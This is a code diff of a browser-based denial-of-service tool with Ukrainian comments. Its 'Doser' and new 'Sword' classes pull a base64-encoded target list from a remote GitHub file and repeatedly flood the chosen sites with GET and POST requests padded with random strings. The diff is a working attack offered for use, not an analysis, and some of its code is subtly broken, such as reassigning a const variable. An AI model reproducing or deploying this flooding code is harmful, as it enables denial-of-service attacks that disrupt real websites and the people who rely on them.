@@ -1,152 +1,148 @@
 /*!
 MIT License
 
-Copyright (c) 2022 Yuriy Bogdan
-<>
+Copyright (c) 2022-2023 Yuriy Bogdan
 */
 
 // @ts-nocheck
 
-/**
- * Інструменти
- */
 const Tools = {
-	/**
-	 * Зберігання данних про атаки
-	 */
-	addCount() {
-		$('#attacks').text(+$('#attacks').text() + 1);
-		++Database.attacks;
+	charSet: "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890",
+
+	getFlood(lenght) {
+		let flood = "";
+
+		for (let i = 0; i < lenght; i++) {
+			flood += randomChoice(this.charSet)
+		}
+		return flood
 	},
-
 	/**
-	 * Показ цілі користувачу
-	 *
-	 * @param {Target} target
+	 * Отримання цілей для атаки
+	 * 
+	 * Беруться цілі, для яких в нас є **потрібний метод** для атаки
+	 * 
+	 * @example 
+	 * await Tools.getTargets()
+	 * [
+	 *   {
+	 *     "page": "https://russia.ru",
+	 *     "method": "get"
+	 *   },
+	 *   ...
+	 * ]
+	 * 
+	 * @param {array} supportedMethods - Методи, якими ми можемо атакувати
+	 * @returns {Promise<Target[]>} **Відфільтровані цілі** (вилучаються цілі, для яких треба _специфічні_ методи атаки)
 	 */
-	setTarget(target) {
-		$('#target').text(target.page);
-		$('#method').text(target.method);
-	},
+	async getTargets(supportedMethods) {
+		return await fetch(targetSource).then(async function (response) {
+			if (response.ok) {
+				const responseText = await response.text()
 
-	/**
-	 * Завантажувач цілей
-	 *
-	 * @returns {Promise<Target>} Рандомна ціль
-	 * @throws {Error} Помилка завантаження
-	 */
-	async getTargets() {
-		return await fetch(Doser.targetSource, { cache: 'no-cache' }).then(
-			async function (response) {
-				console.log(response);
-				response = await response.text();
+				/** @type {Target[]} */
+				const encodedData = JSON.parse(atob(responseText))
 
-				const encodedData = atob(response);
+				/** @type {Target[]} */
+				let filteredTargets = []
 
-				const data = JSON.parse(encodedData);
-
-				/** @type Target[] */
-				let targets = [];
-
-				// Фільтрування цілей
-				for (let i in data) {
-					if (['post', 'get'].includes(data[i].method)) {
-						targets.push(data[i]);
-					}
+				for (let target of encodedData) {
+					supportedMethods.includes(target.method) && filteredTargets.push(target)
 				}
-				$('#load').remove();
 
-				return randomChoice(targets); // Рандомна ціль
-			},
-			(e) => console.error('Помилка завантаженя! ', e)
-		);
-	},
-};
+				return filteredTargets;
+			}
+		},
+		() => {}
+		)
+	}
+}
 
-/**
- * Воркер
- */
-class Doser {
-	/**
-	 * Конструктор досера
-	 *
-	 * TODO: Доробити SFX
-	 *
-	 * @constructor
-	 */
+class Sword {
 	constructor() {
-		/** Стан атаки */
-		this.attack = false;
-		/** Інтервал для `fetch` атаки */
-		this.attackInterval = 600;
-		this.targetSource =
-			'https://raw.githubusercontent.com/xzyallzjx-231/iouzjla-612/main/40.json';
+		this.defaultRequestParams = {
+			cache: 'no-cache',
+			referrerPolicy: 'no-referrer',
+			mode: 'no-cors'
+		}
 	}
 
-	go() {
-		this.attack ? this.stop() : this.start();
+	async attack(target) {
+		this[target.method](target)
 	}
 
-	/**
-	 * Запуск атаки
-	 */
+
+	async request(url, data) {
+		await fetch(url, {
+			...this.defaultRequestParams,
+			...data
+		})
+	}
+
+	async get(target) {
+		const page = target.page
+
+		if (!page.includes("?")) {
+			page += "/" + Tools.getFlood(64)
+		}
+
+		await this.request(page, {
+			method: "GET"
+		})
+	}
+
+	async post(target) {
+		await this.request(target.page, {
+			method: "POST",
+			body: Tools.getFlood(128)
+		})
+	}
+}
+
+class Doser {
+	constructor() {
+		this.attack = false
+		this.attackInterval = 400
+		this.supportedAttackMethods = ['post', 'get']
+	}
+
+	async run() {
+		this.attack ? this.stop() : this.start()
+	}
+
 	async start() {
 		if (!this.attack) {
-			this.attack = true;
-			$('#button').text('Стоп');
+			Panel.buttonText("Стоп")
+			Sounds.click.play()
+			this.attack = true
 
-			// Завантаження цілей
-			this.target = await Tools.getTargets();
+			const targets = await Tools.getTargets(this.supportedAttackMethods)
 
-			console.log(this.target);
+			if (!targets) {
+				swal("Помилка", "Не вдалось завантажити цілі", "error")
+				Panel.buttonText("Старт!")
+				return;
+			} // else
 
-			// Якщо цілі не завантажились
-			if (!this.target) {
-				// Якщо не завнтажились цілі
+			// Атакоцикл, брум-брум! 😂
+			this.attackCycle = setInterval(async () => {
+				const randomTarget = randomChoice(targets)
 
-				swal(
-					'Помилка!',
-					'Перевірте підключення до інтернету!',
-					'error'
-				);
+				Panel.showCurrentTarget(randomTarget)
 
-				this.attack = false;
-				$('#button').text('Старт!');
-				return; // Стоп
-			}
+				await Sword.attack(randomTarget)
+					.then(() => Panel.increaseAttacksCounter(),
+						  () => Panel.increaseAttacksCounter())
 
-			// Показ цілей
-			Tools.setTarget(this.target);
-			console.log(this.target);
-
-			// Старт атаки
-
-			// TODO: ЗРОБИТИ РЕКУРСИВНИЙ TIMEOUT!
-			let attack = async () => {
-				await fetch(this.target.page, {
-					method: 'GET',
-					mode: 'no-cors',
-					referrerPolicy: 'no-referrer',
-					cache: 'no-cache',
-				}).then(
-					() => Tools.addCount(),
-					() => Tools.addCount()
-				);
-			};
-
-			this.interval = setInterval(attack, this.attackInterval);
+			}, this.attackInterval)
 		}
 	}
 
-	/**
-	 * Зупинка атаки
-	 */
+	/** Зупинка атаки */
 	stop() {
-		if (this.interval && this.attack) {
-			this.attack = false;
-			clearInterval(this.interval);
-			console.clear();
-			$('#button').text('Старт!');
-		}
+		clearInterval(this.attackCycle)
+		this.attack = false
+		Sounds.click.play()
+		Panel.buttonText("Старт!")
 	}
 }
